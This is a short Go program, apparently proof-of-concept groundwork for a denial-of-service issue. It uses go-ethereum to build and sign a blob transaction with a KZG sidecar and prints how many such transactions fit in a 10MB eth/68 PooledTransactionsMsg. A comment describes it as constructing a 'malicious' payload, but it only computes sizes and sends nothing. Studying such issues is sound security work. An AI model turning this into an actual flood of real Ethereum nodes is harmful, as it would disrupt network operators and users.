package main

import (
	"crypto/sha256"
	"fmt"
	"log"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/crypto/kzg4844"
	"github.com/ethereum/go-ethereum/rlp"
	"github.com/holiman/uint256"
)

// This script demonstrates how to construct the malicious PooledTransactionsMsg payload.
// It generates a Blob Transaction with a sidecar (network encoding) and prints the RLP size.

func main() {
	// 1. Generate a random key
	key, err := crypto.GenerateKey()
	if err != nil {
		log.Fatal(err)
	}

	// 2. Create dummy blob data
	var blob kzg4844.Blob
	copy(blob[:], "malicious_blob_data")

	// 3. Create commitment and proof (valid for the blob)
	commit, err := kzg4844.BlobToCommitment(&blob)
	if err != nil {
		log.Fatal(err)
	}
	proof, err := kzg4844.ComputeBlobProof(&blob, commit)
	if err != nil {
		log.Fatal(err)
	}

	// 4. Create the Blob Transaction
	chainID := uint256.NewInt(1)
	txData := &types.BlobTx{
		ChainID:    chainID,
		Nonce:      0,
		GasTipCap:  uint256.NewInt(1000000000),
		GasFeeCap:  uint256.NewInt(2000000000),
		Gas:        21000,
		To:         common.Address{},
		Value:      uint256.NewInt(0),
		Data:       nil,
		AccessList: nil,
		BlobFeeCap: uint256.NewInt(1000000000),
		BlobHashes: []common.Hash{kzg4844.CalcBlobHashV1(sha256.New(), &commit)},
		Sidecar: &types.BlobTxSidecar{
			Blobs:       []kzg4844.Blob{blob},
			Commitments: []kzg4844.Commitment{commit},
			Proofs:      []kzg4844.Proof{proof},
		},
	}

	// 5. Sign the transaction
	signer := types.NewCancunSigner(chainID.ToBig())
	tx, err := types.SignNewTx(key, signer, txData)
	if err != nil {
		log.Fatal(err)
	}

	// 6. Encode to RLP (Network Format)
	// The presence of tx.Sidecar ensures BlobTx.encode uses the network format (wrapper struct)
	encoded, err := rlp.EncodeToBytes(tx)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("Single BlobTx Size (Network Encoded): %d bytes\n", len(encoded))

	// 7. Calculate capacity in 10MB message
	// eth/68 PooledTransactionsMsg is a list of transactions: []*types.Transaction
	// We simulate a list of N transactions
	const maxMsgSize = 10 * 1024 * 1024 // 10MB
	count := maxMsgSize / len(encoded)

	fmt.Printf("Max transactions per 10MB message: %d\n", count)
	fmt.Printf("Total payload size: %d bytes\n", count*len(encoded))
}
